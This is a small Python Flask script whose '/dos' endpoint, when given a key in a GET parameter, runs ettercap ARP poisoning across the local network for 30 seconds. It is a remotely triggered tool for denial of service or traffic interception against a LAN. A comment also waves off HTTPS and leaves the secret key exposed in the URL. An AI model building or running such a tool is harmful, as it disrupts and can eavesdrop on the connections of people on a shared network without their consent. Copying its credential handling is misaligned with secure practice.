import subprocess
import time
import os

from flask import Flask, request

SERVER_KEY = os.environ["WGYHTSS_KEY"]
FILTER_TIME = 30

app = Flask(__name__)

@app.route("/dos")
def wgythss():
    # it's not like i'm going to be using https here
    # so having it as a GET param is fine
    key = request.args.get("key", "")

    if key is None or key != SERVER_KEY:
        return {}, 401

    with subprocess.Popen(
        "sudo ettercap -T -q -M arp", stdin=subprocess.PIPE, shell=True
    ) as p:
        time.sleep(FILTER_TIME)
        p.communicate(b"q")

    return {}, 200
